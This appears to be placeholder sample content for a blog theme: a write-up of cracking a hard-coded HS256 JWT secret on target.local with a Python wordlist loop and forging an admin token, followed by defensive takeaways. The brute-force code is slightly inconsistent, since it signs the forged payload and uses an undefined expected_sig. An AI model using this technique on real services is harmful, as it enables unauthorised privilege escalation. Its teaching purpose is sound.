The service signs a session JWT with a hard-coded secret and trusts the
`role` claim. This is a walkthrough of finding the secret and forging an
admin token. Replace this with your own writeup — it is here to show every
theme feature at work.

## Recon

The login response hands us a token:

```bash
curl -s http://target.local/api/session | jq -r .token
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Decoding the header and payload shows `alg: HS256` and a lowercase `role`
claim. Nothing exotic yet.

## Finding the weakness

The verification endpoint leaks whether a signature is valid through a
difference in response time. The key space is small enough to brute force
locally with a wordlist:

```python
import hmac, hashlib, base64

def b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")

header = b64(b'{"alg":"HS256","typ":"JWT"}')
payload = b64(b'{"user":"guest","role":"admin"}')
signing_input = header + b"." + payload

for word in open("words.txt", "rb"):
    word = word.strip()
    mac = hmac.new(word, signing_input, hashlib.sha256).digest()
    if b64(mac) == expected_sig:
        print("secret:", word.decode())
        break
```

An HMAC is defined as

$$
H(K, m) = H\bigl((K \oplus opad) \parallel H((K \oplus ipad) \parallel m)\bigr)
$$

so with a short secret the whole search fits in a few seconds.

## Forging the token

With the secret recovered, sign a new payload and send it back:

```python
token = signing_input + b"." + b64(hmac.new(b"hunter2", signing_input, hashlib.sha256).digest())
```

## Takeaways

| Mistake | Impact |
| --- | --- |
| Hard-coded signing key | Anyone can forge tokens |
| Role stored in a client-side claim | Privilege escalation |
| Verbose timing difference | Key recovery |

Always keep signing keys in a secret manager and verify authorisation
server-side.
